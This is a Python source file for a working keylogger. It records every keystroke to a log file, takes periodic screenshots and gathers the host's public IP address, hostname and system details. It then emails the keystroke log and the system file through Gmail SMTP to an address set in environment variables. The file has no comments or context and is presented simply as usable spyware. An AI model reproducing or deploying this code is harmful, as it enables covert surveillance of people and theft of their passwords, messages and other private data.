from pynput.keyboard import Key, Listener
from requests import get
import os
import socket
import platform
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from dotenv import load_dotenv

load_dotenv()
keystrokes = []
timer = 0
counter = 0
second_timer = 0

email_add = os.environ["EMAIL_ADDRESS"]
log_file = "log.txt"
file_path = os.environ["PATH"]
extend = "\\"
file_merge = file_path + extend

def pressed(k):
    global keystrokes, timer, counter, second_timer

    keystrokes.append(k)
    timer += 1
    if timer >= 10:
        second_timer += 1
        screenshot()
        counter += 1
        timer = 0
        if second_timer > 5:
            send_email(log_file, file_path + extend + log_file, email_add)
            send_email("sysinfo.txt", file_path + extend + "sysinfo.txt", email_add)
    write(keystrokes)
    keystrokes = []

def write(keystrokes):
    with open("log.txt", "a") as f:
        for k in keystrokes:
            clean_k = str(k).replace("'","")
            if clean_k.find("space") > 0:
                f.write(" ")
            elif clean_k.find("enter") > 0:
                f.write("\n")
            elif clean_k.find("Key") == -1:
                f.write(clean_k)

def relesed(k):
    if k == Key.esc:
        return False

def pc_info():
    with open("sysinfo.txt", "a") as f:
        hostname = socket.gethostname()
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("\n")

def screenshot():
    im = ImageGrab.grab()
    im.save(f"screenshots\\screen_{counter}.jpg")

def send_email(filename, attachment, receiver):

    sender_email = os.environ["SENDER_EMAIL"]
    passwd = os.environ["PASSWD"]
    msg = MIMEMultipart()

    msg['From'] = sender_email
    msg['To'] = receiver
    msg['Subject'] = "Log"
    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.starttls()
    smtp.login(sender_email, passwd)
    text = msg.as_string()
    smtp.sendmail(sender_email, receiver, text)
    smtp.quit()



pc_info()
with Listener(on_press=pressed, on_release=relesed) as listener:
    listener.join()
